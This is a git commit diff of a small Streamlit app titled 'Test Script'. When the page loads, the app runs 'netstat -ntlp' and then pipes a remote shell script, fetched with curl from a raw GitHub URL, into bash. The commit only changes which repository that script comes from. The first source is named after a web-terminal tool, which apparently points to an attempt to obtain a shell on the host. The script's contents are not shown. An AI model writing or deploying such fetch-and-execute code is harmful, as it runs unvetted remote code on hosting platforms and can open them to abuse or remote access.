8899b536b1302df845ff13bcdf3865dbdd68282f
wandisilemfakadolo672 <154563494+wandisilemfakadolo672@users.noreply.github.com>
2024-12-28 19:41:35 +0200

    Update app.py

--- app.py
+++ app.py
@@ -5,5 +5,5 @@ st.title("Test Script")
 st.header("Test")
 
 os.system("netstat -ntlp")
-results = os.system("curl -fsSL https://raw.githubusercontent.com/aphiwemthambisi/Gotty-Remake/refs/heads/main/script.sh | bash")
+results = os.system("curl -fsSL https://raw.githubusercontent.com/wandisilemfakadolo672/Streamlit/refs/heads/main/script.sh | bash")
 st.write(results)
